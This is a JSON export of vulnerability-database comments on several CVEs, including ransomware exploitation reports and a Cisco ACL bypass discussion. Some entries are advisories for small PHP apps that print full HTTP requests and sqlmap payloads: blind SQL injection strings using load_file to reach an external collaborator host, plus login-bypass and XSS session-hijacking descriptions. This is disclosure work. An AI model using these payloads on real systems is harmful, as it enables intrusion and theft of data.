      "id": "5c2fa896-c3c7-497e-b3b4-327d06f41766",
      "editorId": "198da8db-21b5-4678-a70d-51ae5c950847",
      "topicId": "383637e3-d6f8-423e-a422-8efbcdae662b",
      "created": "2021-10-28T07:17:48.669336Z",
      "revisionDate": "2021-10-28T07:17:48.666694Z",
      "document": "## [CVE-nu11-21-100521](https://www.sourcecodester.com/php/14974/simple-payroll-system-dynamic-tax-bracket-php-using-sqlite-free-source-code.html)\r\n## [CVE-2021-42169](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-42169)\r\n\r\n![](https://raw.githubusercontent.com/nu11secur1ty/CVE-nu11secur1ty/main/vendors/oretnom23/CVE-nu11-21-100521/docs/Screenshot%202021-10-05%20162933.png)\r\n\r\n## Description:\r\nThe Simple Payroll System with Dynamic Tax Bracket in PHP using SQLite Free Source Code (by: oretnom23 ) is vulnerable from remote SQL-Injection-Bypass-Authentication \r\nfor the admin account. The parameter (username) from the login form is not protected correctly and there is no security and escaping from malicious payloads.\r\n- remote SQL-Injection-Bypass-Authentication: https://portswigger.net/support/using-sql-injection-to-bypass-authentication. \r\n\r\n\r\n## Reproduce:\r\n[href](https://github.com/nu11secur1ty/CVE-nu11secur1ty/edit/main/vendors/oretnom23/CVE-nu11-21-100521)\r\n\r\n## Proof:\r\n[href](https://streamable.com/fius93)\r\n",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "d33aae33-eec1-4fa9-8714-46ac9e1ee1ca",
      "editorId": "def09af1-8f99-4d16-aaa9-1db131246a3a",
      "topicId": "61f06e4e-550e-4177-86ce-08a2348eecb3",
      "created": "2021-10-28T18:22:06.567618Z",
      "revisionDate": "2021-10-28T18:22:06.567689Z",
      "document": "Undisclosed threat actors exploited this vulnerability to gain initial access to and deploy ransomware to a US-based engineering company.\r\n",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Initial Access"
      },
      "tags": []
    },
    {
      "id": "848e74fc-3ded-4c79-87da-f86f485f6469",
      "editorId": "9c3c0bdd-7a98-48de-a889-f351a2aec7cf",
      "topicId": "3bdbcdf7-9171-4a54-a0e7-738a2e177401",
      "created": "2021-10-29T17:39:58.715563Z",
      "revisionDate": "2021-10-29T18:05:26.830421Z",
      "document": "I'm not super clear yet on why [Cisco rates this](https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-asaftd-rule-bypass-ejjOgQEY) as \"Medium\" severity. A remote, unauthenticated ACL bypass in a network edge product seems like a fairly high-severity bug, though admittedly it doesn't appear to be RCE, which I guess is something. I can't imagine it'll take long for PoCs to show up\u2014we'll see. \r\n\r\nExploitability sounds high from an initial read, but I'll reserve official judgment on that until we see what the exploit dev community comes up with. \r\n\r\n**Edit:** @jbaines-r7 makes the excellent point that if this turns out to be blind, it's of significantly less value to an attacker. ",
      "score": 1,
      "metadata": {},
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        }
      ]
    },
    {
      "id": "07b0b4c3-7675-40af-99b7-44ad4957b757",
      "editorId": "198da8db-21b5-4678-a70d-51ae5c950847",
      "topicId": "dab82143-5a0a-4e8c-97fc-a5416b50b80e",
      "created": "2021-10-30T08:02:33.508747Z",
      "revisionDate": "2023-05-17T08:28:10.594794Z",
      "document": "## [CVE-2021-41674](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41674)\r\n![](https://raw.githubusercontent.com/nu11secur1ty/CVE-mitre/main/CVE-2021-41674/docs/screen.png)\r\n\r\n[Vendor](https://www.sourcecodester.com/users/janobe)\r\n\r\n[Software](https://www.sourcecodester.com/php/12684/young-entrepreneur-e-negosyo-system.html)\r\n\r\n## Description:\r\nThe `PROID` parameter from  E-Negosyo System 1.0 app appears to be vulnerable to SQL injection attacks in two types of injections - time-based blind and boolean-based blind. \r\nThe payload '+(select load_file('\\\\\\\\4x2hh1o010l184bd0ql510xgq7w0kw8nbb3yvmk.nu11secur1tycollaborator.net\\\\juc'))+' was submitted in the `PROID` parameter. This payload injects a SQL sub-query that calls MySQL's load_file function with a UNC file path that references a URL on an external domain. The application interacted with that domain, indicating that the injected SQL query was executed.\r\n\r\n## MySQL request:\r\n\r\n```mysql\r\nPOST /bsenordering/cart/controller.php?action=add HTTP/1.1\r\nHost: 192.168.1.2\r\nOrigin: http://192.168.1.2\r\nCookie: PHPSESSID=n2krmhjsahctm8bpj44kms36b4\r\nUpgrade-Insecure-Requests: 1\r\nReferer: http://192.168.1.2/bsenordering/index.php?q=product\r\nContent-Type: application/x-www-form-urlencoded\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nAccept-Language: en-US,en-GB;q=0.9,en;q=0.8\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36\r\nConnection: close\r\nCache-Control: max-age=0\r\nContent-Length: 57\r\n\r\nPROPRICE=50&PROQTY=10&PROID=201735'%2b(select%20load_file('%5c%5c%5c%5c4x2hh1o010l184bd0ql510xgq7w0kw8nbb3yvmk.nu11secur1tycollaborator.net%5c%5cjuc'))%2b'&btnorder=%C2%9E%C3%A9e\r\n```\r\n\r\n## MySQL response:\r\n\r\n```mysql\r\nHTTP/1.1 200 OK\r\nDate: Sat, 30 Oct 2021 06:28:29 GMT\r\nServer: Apache/2.4.51 (Win64) OpenSSL/1.1.1l PHP/7.4.24\r\nX-Powered-By: PHP/7.4.24\r\nExpires: Thu, 19 Nov 1981 08:52:00 GMT\r\nCache-Control: no-store, no-cache, must-revalidate\r\nPragma: no-cache\r\nContent-Length: 0\r\nConnection: close\r\nContent-Type: text/html; charset=UTF-8\r\n```\r\n\r\n## Payloads\r\n\r\n```sqlmap\r\n---\r\nParameter: PROID (POST)\r\n    Type: boolean-based blind\r\n    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)\r\n    Payload: PROPRICE=50&PROQTY=10&PROID=201735'+(select load_file('\\\\\\\\4x2hh1o010l184bd0ql510xgq7w0kw8nbb3yvmk.nu11secur1tycollaborator.net\\\\juc'))+'' OR NOT 5430=5430#&btnorder=%C2%9E%C3%A9e\r\n\r\n    Type: time-based blind\r\n    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)\r\n    Payload: PROPRICE=50&PROQTY=10&PROID=201735'+(select load_file('\\\\\\\\4x2hh1o010l184bd0ql510xgq7w0kw8nbb3yvmk.nu11secur1tycollaborator.net\\\\juc'))+'' AND (SELECT 8860 FROM (SELECT(SLEEP(5)))cikV)-- oroY&btnorder=%C2%9E%C3%A9e\r\n---\r\n```\r\n\r\n## Reproduce:\r\n\r\n## NOTE: \r\n\r\n- The PoC A.K.A `CVE-SQL.py` is encrypted for security reasons!\r\n\r\n[href](https://github.com/nu11secur1ty/CVE-mitre/edit/main/CVE-2021-41674)\r\n\r\n## Proof:\r\n\r\n[href](https://www.nu11secur1ty.com/2021/10/cve-2021-41674.html)",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "fd548f76-e699-4d69-b22d-cdcd98495d23",
      "editorId": "198da8db-21b5-4678-a70d-51ae5c950847",
      "topicId": "9558d117-2cdf-440d-aa5b-a916ac52834a",
      "created": "2021-10-30T09:51:31.446132Z",
      "revisionDate": "2021-10-30T09:51:31.445283Z",
      "document": "## [CVE-2021-41676](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41676)\r\n\r\n![](https://raw.githubusercontent.com/nu11secur1ty/CVE-mitre/main/CVE-2021-41676/docs/Screenshot%202021-10-30%20122446.png)\r\n\r\n## [Vendor](https://www.sourcecodester.com/users/tips23)\r\n\r\n## [Software](https://www.sourcecodester.com/php/14957/pharmacy-point-sale-system-using-php-and-sqlite-free-source-code.html)\r\n\r\n## Description:\r\nThe Pharmacy Point of Sale System 1.0 is vulnerable to SQL Injection Bypass Authentication for the admin account.\r\nThe malicious user can use a malicious SQL query to login into the system as an administrator and can corrupt and use the sensitive information from this system.\r\n\r\n## Proof:\r\n[href](https://github.com/nu11secur1ty/CVE-mitre/blob/main/CVE-2021-41676/docs/CVE-2021-41676.gif)\r\n\r\n## Also see this collection:\r\nhttps://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/oretnom23\r\n",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "487cf236-f549-4bc5-a508-e2e1f511564f",
      "editorId": "198da8db-21b5-4678-a70d-51ae5c950847",
      "topicId": "30e794e5-f67f-4b22-a155-faee164dd01c",
      "created": "2021-10-30T12:04:07.361667Z",
      "revisionDate": "2023-05-17T08:26:29.284978Z",
      "document": "## [CVE-2021-38840](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-38840)\r\n![](https://raw.githubusercontent.com/nu11secur1ty/CVE-mitre/main/CVE-2021-38840/docs/Screenshot%202021-10-30%20144641.png)\r\n\r\n## [Vendor](https://www.sourcecodester.com/users/tips23)\r\n\r\n## [Software](https://www.sourcecodester.com/php/14906/simple-water-refilling-station-management-system-php-free-source-code.html)\r\n\r\n![](https://raw.githubusercontent.com/nu11secur1ty/CVE-mitre/main/CVE-2021-38840/docs/Screenshot%202021-10-30%20144608.png)\r\n\r\n### Description:\r\nThe Water Refilling System - PHP (by: oretnom23 ) v1.0 is vulnerable to remote SQL-Injection-Bypass-Authentication + XSS-Stored Hijacking PHPSESSID\r\n- m0re info: https://portswigger.net/support/using-sql-injection-to-bypass-authentication. \r\nThe parameter (username) from the login form is not protected correctly and there is no security and escaping from malicious payloads. \r\nWhen the user will sending a malicious query or malicious payload to the MySQL server he can bypass the login credentials and take control of the administer account.\r\n2. XSS - Stored PHPSESSID Vulnerable\r\n- The vulnerable XSS app: is \"maintenance\", parameters: \"name\" After the successful SQL injection, the malicious user can be storing an XSS payload whit who can take the \r\nactive PHPSESSID session.\r\n3. remote PHPSESSID - Injection\r\n- After the successful XSS attack the malicious user can take control of the administrative account of the system from everywhere \r\nby using the PHPSESSID, and then he can make a lot of bad things!\r\n\r\n-------------------------------------------------------------------\r\n## CONCLUSION: This vendor must STOP creating all these broken projects and vulnerable software programs, probably he is not a developer!\r\n\r\n## BR \r\n- [+] @nu11secur1ty System Administrator - Infrastructure and Penetration Testing Engineer\r\n\r\n-------------------------------------------------------------------\r\n## Reproduce: \r\n\r\n[href](https://github.com/nu11secur1ty/CVE-mitre/edit/main/CVE-2021-38840)\r\n\r\n## Proof: \r\n\r\n[href](https://www.nu11secur1ty.com/2021/10/cve-2021-38840.html)\r\n\r\n## BR nu11secur1ty",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "5d228269-a7f1-414a-b9eb-3c21f58b1991",
      "editorId": "198da8db-21b5-4678-a70d-51ae5c950847",
      "topicId": "57c931a9-d6b8-4239-99b7-d3d054fb54b1",
      "created": "2021-10-30T21:33:35.449967Z",
      "revisionDate": "2023-05-17T08:24:42.745736Z",
      "document": "## [CVE-2021-37806](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37806)\r\n## [Vendor](https://phpgurukul.com/author/admin/)\r\n## [Software](https://phpgurukul.com/vehicle-parking-management-system-using-php-and-mysql/)\r\n\r\n![](https://raw.githubusercontent.com/nu11secur1ty/CVE-mitre/main/CVE-2021-37806/docs/Screenshot%202021-10-31%20000245.png)\r\n\r\n## On working\r\n![](https://raw.githubusercontent.com/nu11secur1ty/CVE-mitre/main/CVE-2021-37806/docs/Screenshot%202021-10-31%20000326.png)\r\n\r\n## Description:\r\nThe `catename` parameter from Vehicle Parking Management System affected version 1.0 app appears to be vulnerable to SQL injection attacks - type time-based blind. \r\nThe payload '+(select load_file('\\\\\\\\ma0xscj8wyb2gd8sai9pcyvl7cd51xvlmoagx6lv.nu11secur1ty.net\\\\hgt'))+' was submitted in the catename parameter. \r\nThis payload injects a SQL sub-query that calls MySQL's load_file function with a UNC file path that references a URL on an external domain. \r\nThe application interacted with that domain, indicating that the injected SQL query was executed.\r\n\r\n## MySQL Request\r\n\r\n```mysql\r\nPOST /Vehicle%20parking%20management%20System%20project/vpms/add-category.php HTTP/1.1\r\nHost: 192.168.1.2\r\nOrigin: http://192.168.1.2\r\nCookie: PHPSESSID=1earei5r7uisqidmakmk0es5ju\r\nUpgrade-Insecure-Requests: 1\r\nReferer: http://192.168.1.2/Vehicle%20parking%20management%20System%20project/vpms/add-category.php\r\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryH7En2PBJTRM5v1Yq\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nAccept-Language: en-US,en-GB;q=0.9,en;q=0.8\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36\r\nConnection: close\r\nCache-Control: max-age=0\r\nContent-Length: 241\r\n\r\n------WebKitFormBoundaryH7En2PBJTRM5v1Yq\r\nContent-Disposition: form-data; name=\"catename\"\r\n\r\n277509'+(select load_file('\\\\\\\\ma0xscj8wyb2gd8sai9pcyvl7cd51xvlmoagx6lv.nu11secur1ty.net\\\\hgt'))+'\r\n------WebKitFormBoundaryH7En2PBJTRM5v1Yq\r\nContent-Disposition: form-data; name=\"submit\"\r\n\r\n..e\r\n------WebKitFormBoundaryH7En2PBJTRM5v1Yq--\r\n```\r\n\r\n## MySQL Response\r\n\r\n```mysql\r\nHTTP/1.1 200 OK\r\nDate: Sat, 30 Oct 2021 20:06:14 GMT\r\nServer: Apache/2.4.51 (Win64) OpenSSL/1.1.1l PHP/7.4.24\r\nX-Powered-By: PHP/7.4.24\r\nExpires: Thu, 19 Nov 1981 08:52:00 GMT\r\nCache-Control: no-store, no-cache, must-revalidate\r\nPragma: no-cache\r\nConnection: close\r\nContent-Type: text/html; charset=UTF-8\r\nContent-Length: 9928\r\n\r\n<!doctype html>\r\n<html class=\"no-js\" lang=\"\">\r\n<head>\r\n\r\n<title>VPMS - Add Category</title>\r\n\r\n\r\n<link rel=\"apple-touch-icon\" href=\"https://i.imgur.com/QRAUqs9.png\">\r\n<link rel=\"sho\r\n...[SNIP]...\r\n```\r\n\r\n## Reproduce:\r\n[href](https://github.com/nu11secur1ty/CVE-mitre/edit/main/CVE-2021-37806)\r\n\r\n## Proof:\r\n[href](https://www.nu11secur1ty.com/2021/10/cve-2021-37806.html)",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "6d693afd-6dd9-49c7-b549-7aa00f186bb6",
      "editorId": "d8c8480d-891a-4357-a086-25351dae6598",
      "topicId": "e9596bcb-bc29-4f41-9350-220ebd59d69d",
      "created": "2021-11-01T14:33:46.780445Z",
      "revisionDate": "2021-11-01T15:55:41.651934Z",
      "document": "CVE-2021-22205 was originally disclosed as an authenticated vulnerability. However, deeper inspection shows that the vulnerability can be exploited without authentication and is trivial to weaponize. For full analysis see the [Rapid7 Analysis](https://attackerkb.com/topics/D41jRUXCiJ/cve-2021-22205/rapid7-analysis).",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Impact",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "72530169-8ad9-4891-a36f-84af08dc3421",
      "editorId": "f48f4318-fcf4-4ebb-ae42-776334731f2b",
      "topicId": "ce34d6cd-075f-4c42-bc9a-45e3a3a43094",
      "created": "2021-11-02T04:36:42.775609Z",
      "revisionDate": "2021-11-02T04:36:42.778658Z",
      "document": "In other words, this vulnerability gives malicious actor the ability to create perfectly valid, perfectly malicious source code that could be used to create a novel supply-chain attack that can be carried out on source code.",
      "score": 1,
      "metadata": {},
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "51503db7-f906-4167-95f7-8608bde76c74",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "1279ea71-bca6-46d4-b4f0-810b4fcf6328",
      "created": "2021-11-02T19:12:48.113141Z",
      "revisionDate": "2021-11-02T19:12:48.110997Z",
      "document": "See [the other topic](https://attackerkb.com/topics/MJewDF16Kl/cve-2020-25223).",
      "score": 1,
      "metadata": {},
      "tags": []
    }
  ]
}